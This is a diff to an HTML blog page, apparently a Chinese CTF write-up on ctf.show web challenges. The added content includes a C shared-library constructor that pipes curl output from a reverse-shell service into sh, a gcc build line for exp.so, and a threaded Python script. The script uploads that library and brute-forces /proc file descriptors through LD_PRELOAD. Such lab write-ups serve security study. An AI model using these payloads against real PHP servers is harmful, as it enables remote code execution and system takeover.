@@ -769,11 +769,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 5.4k |
+            <i class="fas fa-file-text-o"></i> 字数统计: 5.7k |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 24分钟 |
+            <i class="fas fa-clock"></i> 阅读时长: 25分钟 |
           </span>
   
           
@@ -900,9 +900,8 @@ __attribute__((constructor))void payload()&#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后直接gcc生成共享库</p>
-<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC a.c -o hack&amp;&amp;gcc --share hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
+<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC a.c -o hack&amp;&amp;gcc --share hack -o hack.so
+gcc -c -fPIC exp.c -o exp &amp;&amp; gcc -shared exp -o exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h3 id="利用LD-PRELOAD劫持getuid函数"><a href="#利用LD-PRELOAD劫持getuid函数" class="headerlink" title="利用LD_PRELOAD劫持getuid函数"></a>利用LD_PRELOAD劫持getuid函数</h3><p>上面的方法，需要重启或者命令行来执行php重载so文件，利用条件苛刻，所以我们需要寻找到不重启php-fpm的方法。</p>
 <h4 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><pre class="line-numbers language-none"><code class="language-none"> &lt;?php
@@ -1226,7 +1225,7 @@ if(isset($env))&#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里跟上面那题大同小异，上面的题目是直接缓存了我们的shell，而这题我们需要直接缓存一个恶意的so文件。  </p>
-<h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><p>恶意的so文件使用上面做过的题目生成的就行了，也可</p>
+<h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><p>恶意的so文件使用上面做过的题目生成的就行了，也可以用下面的c文件生成</p>
 <pre class="line-numbers language-none"><code class="language-none">#include&lt;stdlib.h&gt;
 #include&lt;stdio.h&gt;
 #include&lt;string.h&gt;
@@ -1236,7 +1235,6 @@ __attribute__ ((__constructor__)) void preload(void)
     system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | sh&quot;);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>以用下面的c文件生成</p>
 <pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-
 # @Author: h1xa
 # @Date:   2022-04-27 12:43:50
@@ -1307,6 +1305,67 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 	main()
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>群主的脚本似乎跑不出来818，这里借用yu师傅的脚本，tql！</p>
+<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
+
+import urllib.parse
+import  threading, requests
+import socket
+import re
+port&#x3D; 28166
+s&#x3D;socket.socket()
+s.connect((&#39;pwn.challenge.ctf.show&#39;,port))
+s.send(f&#39;&#39;&#39;GET &#x2F; HTTP&#x2F;1.1
+Host:127.0.0.1
+
+	&#39;&#39;&#39;.encode())
+data&#x3D;s.recv(1024).decode()
+s.close()
+pid &#x3D; re.findall(&#39;(.*?) www-data&#39;,data)[0].strip()
+print(pid)
+l&#x3D;str(len(open(&#39;exp.so&#39;,&#39;rb&#39;).read()+b&#39;\n&#39;*1024*200)).encode()
+def upload():
+	while True:
+		s&#x3D;socket.socket()
+		s.connect((&#39;pwn.challenge.ctf.show&#39;,port))
+		x&#x3D;b&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1
+Host: 127.0.0.1
+User-Agent: yu22x
+Content-Length: &#39;&#39;&#39;+l+b&#39;&#39;&#39;
+Content-Type: application&#x2F;x-www-form-urlencoded
+Connection: close
+
+&#39;&#39;&#39;+open(&#39;exp.so&#39;,&#39;rb&#39;).read()+b&#39;\n&#39;*1024*200+b&#39;&#39;&#39;
+
+&#39;&#39;&#39;
+		s.send(x)
+		s.close()
+
+def bruter():
+	while True:
+		for fd in range(10,16):
+			print(fd)
+			s&#x3D;socket.socket()
+			s.connect((&#39;pwn.challenge.ctf.show&#39;,port))
+			s.send(f&#39;&#39;&#39;GET &#x2F;?env&#x3D;LD_PRELOAD&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1
+Host: 127.0.0.1
+User-Agent: yu22x
+Connection: close
+
+&#39;&#39;&#39;.encode())
+			print(s.recv(2048).decode())
+			s.close()
+
+
+for i in range(30):
+    t &#x3D; threading.Thread(target&#x3D;upload)
+    t.start()
+for j in range(30):
+    a &#x3D; threading.Thread(target&#x3D;bruter)
+    a.start()
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="思路二-想办法利用环境变量（web入门-819）"><a href="#思路二-想办法利用环境变量（web入门-819）" class="headerlink" title="思路二 想办法利用环境变量（web入门-819）"></a>思路二 想办法利用环境变量（web入门-819）</h4><h5 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h5><pre class="line-numbers language-none"><code class="language-none">$env &#x3D; $_GET[&#39;env&#39;];
 if(isset($env))&#123;
